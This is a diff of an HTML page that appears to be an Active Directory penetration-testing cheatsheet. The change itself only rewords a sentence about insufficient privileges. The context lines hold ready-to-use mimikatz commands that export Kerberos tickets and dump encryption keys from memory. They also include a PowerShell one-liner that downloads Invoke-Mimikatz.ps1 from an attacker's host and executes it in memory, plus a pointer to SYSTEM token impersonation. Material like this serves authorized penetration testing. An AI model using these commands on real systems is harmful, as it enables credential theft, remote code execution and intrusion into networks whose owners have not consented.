@@ -928,7 +928,7 @@ sekurlsa::tickets<span class="w"> </span>/export
 <p>Dump Kerberos encryption keys from memory by using mimikatz:</p>
 <div class="highlight"><pre><span></span><code>sekurlsa::ekeys
 </code></pre></div>
-<p>If none of the previous commands worked, try to impersonate <strong>NT AUTHORITY\SYSTEM</strong> - see <a href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html#token-impersonation-mimikatz">Token Impersonation with mimikatz</a>.</p>
+<p>If previous commands do not work, the current user might not have enough privileges; try to impersonate <strong>NT AUTHORITY\SYSTEM</strong> - see <a href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html#token-impersonation-mimikatz">Token Impersonation with mimikatz</a>.</p>
 <p>Use PowerSploit's <code>Invoke-Mimikatz.ps1</code> script to run mimikatz in memory:</p>
 <div class="highlight"><pre><span></span><code><span class="nb">iex </span><span class="p">(</span><span class="nb">iwr </span><span class="n">-UseBasicParsing</span> <span class="n">http</span><span class="p">://&lt;</span><span class="n">attacker</span> <span class="n">ip</span><span class="p">&gt;/</span><span class="nb">Invoke-Mimikatz</span><span class="p">.</span><span class="n">ps1</span><span class="p">)</span>
 </code></pre></div>
